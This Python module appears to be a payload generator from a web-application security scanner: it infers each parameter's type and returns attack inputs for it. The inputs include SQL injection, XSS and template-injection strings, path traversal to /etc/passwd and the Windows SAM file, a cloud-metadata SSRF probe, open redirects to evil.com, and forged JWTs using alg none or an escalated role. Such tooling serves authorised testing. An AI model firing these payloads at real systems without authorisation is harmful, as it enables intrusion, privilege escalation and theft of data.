"""Mutation Intelligence — type-aware payload generation.

For every parameter, determine its type, then generate only valid mutations.
"""

from __future__ import annotations

import random
import re
import string
from dataclasses import dataclass
from typing import Any


@dataclass
class ParamType:
    name: str
    category: str
    mutations: list[str]
    confidence: float = 0.8


class TypeDetector:
    UUID_RE = re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', re.I)
    EMAIL_RE = re.compile(r'^[^@]+@[^@]+\.[^@]+$')
    JWT_RE = re.compile(r'^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$')
    INT_RE = re.compile(r'^\d+$')
    FLOAT_RE = re.compile(r'^\d+\.\d+$')
    TIMESTAMP_RE = re.compile(r'^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}')
    URL_RE = re.compile(r'^https?://')
    BOOL_RE = re.compile(r'^(true|false|0|1|yes|no)$', re.I)
    OBJECTID_RE = re.compile(r'^[0-9a-f]{24}$', re.I)
    BASE64_RE = re.compile(r'^[A-Za-z0-9+/]+={0,2}$')

    def detect(self, name: str, value: str) -> ParamType:
        name_lower = name.lower()

        if self.UUID_RE.match(value):
            return ParamType(name, "uuid", self._uuid_mutations(value))
        if self.JWT_RE.match(value):
            return ParamType(name, "jwt", self._jwt_mutations(value))
        if self.EMAIL_RE.match(value):
            return ParamType(name, "email", self._email_mutations(value))
        if self.TIMESTAMP_RE.match(value):
            return ParamType(name, "timestamp", self._timestamp_mutations(value))
        if self.OBJECTID_RE.match(value):
            return ParamType(name, "objectid", self._objectid_mutations(value))
        if self.URL_RE.match(value):
            return ParamType(name, "url", self._url_mutations(value))
        if self.BOOL_RE.match(value):
            return ParamType(name, "boolean", self._bool_mutations(value))
        if self.FLOAT_RE.match(value):
            return ParamType(name, "float", self._numeric_mutations(value))
        if self.INT_RE.match(value):
            return ParamType(name, "integer", self._numeric_mutations(value))

        if any(k in name_lower for k in ["id", "_id", "uid", "user_id"]):
            return ParamType(name, "id", self._id_mutations(value))
        if any(k in name_lower for k in ["price", "amount", "cost", "fee", "total"]):
            return ParamType(name, "price", self._price_mutations(value))
        if any(k in name_lower for k in ["role", "permission", "level", "access"]):
            return ParamType(name, "role", self._role_mutations(value))
        if any(k in name_lower for k in ["name", "title", "label", "description"]):
            return ParamType(name, "text", self._text_mutations(value))
        if any(k in name_lower for k in ["file", "path", "filename", "upload", "image"]):
            return ParamType(name, "filename", self._filename_mutations(value))
        if any(k in name_lower for k in ["token", "key", "secret", "api_key"]):
            return ParamType(name, "token", self._token_mutations(value))
        if any(k in name_lower for k in ["url", "redirect", "next", "return", "goto"]):
            return ParamType(name, "redirect", self._redirect_mutations(value))
        if any(k in name_lower for k in ["page", "offset", "limit", "skip"]):
            return ParamType(name, "pagination", self._pagination_mutations(value))
        if any(k in name_lower for k in ["sort", "order", "direction"]):
            return ParamType(name, "sort", self._sort_mutations(value))
        if any(k in name_lower for k in ["search", "query", "q", "filter"]):
            return ParamType(name, "search", self._search_mutations(value))

        return ParamType(name, "string", self._string_mutations(value))

    def _uuid_mutations(self, value: str) -> list[str]:
        parts = value.split("-")
        return [
            value,
            "-".join(["00000000-0000-0000-0000-000000000000"]),
            "-".join(["ffffffff-ffff-ffff-ffff-ffffffffffff"]),
            "00000000-0000-0000-0000-000000000000",
            "ffffffff-ffff-ffff-ffff-ffffffffffff",
            "" + value[:8] + "-0000-0000-0000-000000000000",
            value[:-1] + "0",
            value[:-1] + "1",
            value.upper(),
            value.replace("-", ""),
            "00000000-0000-0000-0000-000000000001",
            "1",
            "-1",
            "null",
            "undefined",
            "NaN",
            "true",
            "false",
            "'" + value + "'",
            value + "'",
            "' OR '1'='1",
        ]

    def _jwt_mutations(self, value: str) -> list[str]:
        parts = value.split(".")
        if len(parts) != 3:
            return [value]
        import base64, json
        try:
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
        except Exception:
            return [value]

        mutations = [value]

        none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
        none_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
        mutations.append(f"{none_header}.{none_payload}.")

        if "role" in payload:
            for role in ["admin", "superadmin", "administrator", "root", "moderator"]:
                p2 = dict(payload)
                p2["role"] = role
                p2_b64 = base64.urlsafe_b64encode(json.dumps(p2).encode()).rstrip(b"=").decode()
                mutations.append(f"{parts[0]}.{p2_b64}.{parts[2]}")

        if "userId" in payload or "user_id" in payload:
            key = "userId" if "userId" in payload else "user_id"
            for fake_id in ["1", "0", "admin", "null", "undefined", "' OR '1'='1"]:
                p2 = dict(payload)
                p2[key] = fake_id
                p2_b64 = base64.urlsafe_b64encode(json.dumps(p2).encode()).rstrip(b"=").decode()
                mutations.append(f"{parts[0]}.{p2_b64}.{parts[2]}")

        if "exp" in payload:
            p2 = dict(payload)
            p2["exp"] = 9999999999
            p2_b64 = base64.urlsafe_b64encode(json.dumps(p2).encode()).rstrip(b"=").decode()
            mutations.append(f"{parts[0]}.{p2_b64}.{parts[2]}")
            p2["exp"] = 1
            p2_b64 = base64.urlsafe_b64encode(json.dumps(p2).encode()).rstrip(b"=").decode()
            mutations.append(f"{parts[0]}.{p2_b64}.{parts[2]}")

        mutations.append(f"{parts[0]}.{parts[1]}.")
        mutations.append(f"{parts[0]}.{parts[1]}")
        mutations.append(f".{parts[1]}.{parts[2]}")
        mutations.append("")

        return mutations

    def _email_mutations(self, value: str) -> list[str]:
        local, domain = value.split("@", 1) if "@" in value else (value, "x.com")
        return [
            value,
            f"'{value}'",
            f"{value}'",
            f"' OR '1'='1'@{domain}",
            f"admin@{domain}",
            f"{local}+test@{domain}",
            f"{local}@{domain}",
            f"{local}@evil.com",
            f"<script>@{domain}",
            f"{{{{constructor.constructor('return this')()}}}}@{domain}",
        ]

    def _timestamp_mutations(self, value: str) -> list[str]:
        return [value, "1970-01-01T00:00:00Z", "2099-12-31T23:59:59Z", "null", "0", "-1", "9999999999"]

    def _objectid_mutations(self, value: str) -> list[str]:
        return [value, "0" * 24, "f" * 24, value[:-1] + "0", value[:-1] + "1", "null", "", "1"]

    def _url_mutations(self, value: str) -> list[str]:
        return [
            value, "//evil.com", "javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
            "http://localhost", "http://127.0.0.1", "http://169.254.169.254/latest/meta-data/",
            value + "/../../../etc/passwd", value + "%00", value + "@evil.com",
        ]

    def _bool_mutations(self, value: str) -> list[str]:
        return [value, "true", "false", "1", "0", "yes", "no", "null", "undefined", "'true'"]

    def _numeric_mutations(self, value: str) -> list[str]:
        return [value, "0", "-1", "1", "9999999999", "0.0", "-0.0", "null", "NaN", "Infinity", "'1'", "1 OR 1=1"]

    def _id_mutations(self, value: str) -> list[str]:
        base = self._uuid_mutations(value) if self.UUID_RE.match(value) else [value, "1", "0", "-1", "null", "admin", "' OR '1'='1"]
        return base

    def _price_mutations(self, value: str) -> list[str]:
        return [value, "0", "-1", "-999999", "0.01", "999999.99", "null", "NaN", "1 OR 1=1", "'0'", "0.001"]

    def _role_mutations(self, value: str) -> list[str]:
        return [value, "admin", "superadmin", "root", "moderator", "owner", "none", "null", "''", "' OR '1'='1"]

    def _text_mutations(self, value: str) -> list[str]:
        return [value, "", "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "' OR '1'='1", "A" * 10000, "null", "{{7*7}}", "${7*7}"]

    def _filename_mutations(self, value: str) -> list[str]:
        return [value, "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam", "shell.php", "test.php", "file.jpg%00.php", ".htaccess", "Dockerfile", ".env"]

    def _token_mutations(self, value: str) -> list[str]:
        return [value, "", "test", "admin", "null", "Bearer " + value, value[:-5] if len(value) > 5 else value]

    def _redirect_mutations(self, value: str) -> list[str]:
        return [value, "//evil.com", "https://evil.com", "/\\evil.com", "javascript:alert(1)", "data:text/html,<h1>hacked</h1>"]

    def _pagination_mutations(self, value: str) -> list[str]:
        return [value, "0", "-1", "1", "999999", "null", "NaN"]

    def _sort_mutations(self, value: str) -> list[str]:
        return [value, "id", "role", "salary", "password", "../../etc/passwd", "null"]

    def _search_mutations(self, value: str) -> list[str]:
        return [value, "'", "''", "' OR '1'='1", "<script>alert(1)</script>", "{{7*7}}", "\\*"]

    def _string_mutations(self, value: str) -> list[str]:
        return [value, "", "'", "''", "\"", "\"\"", "<script>alert(1)</script>", "{{7*7}}", "null", "undefined", "A" * 5000]


class MutationIntelligence:
    """Type-aware mutation engine.

    Detects parameter types and generates only valid mutations.
    """

    def __init__(self):
        self.detector = TypeDetector()
        self._cache: dict[str, ParamType] = {}

    def get_mutations(self, param_name: str, current_value: str = "") -> list[str]:
        cache_key = f"{param_name}:{current_value}"
        if cache_key in self._cache:
            return self._cache[cache_key].mutations

        param_type = self.detector.detect(param_name, current_value)
        self._cache[cache_key] = param_type
        return param_type.mutations

    def get_type(self, param_name: str, current_value: str = "") -> ParamType:
        cache_key = f"{param_name}:{current_value}"
        if cache_key in self._cache:
            return self._cache[cache_key]
        param_type = self.detector.detect(param_name, current_value)
        self._cache[cache_key] = param_type
        return param_type

    def get_summary(self) -> dict[str, int]:
        type_counts: dict[str, int] = {}
        for pt in self._cache.values():
            type_counts[pt.category] = type_counts.get(pt.category, 0) + 1
        return type_counts
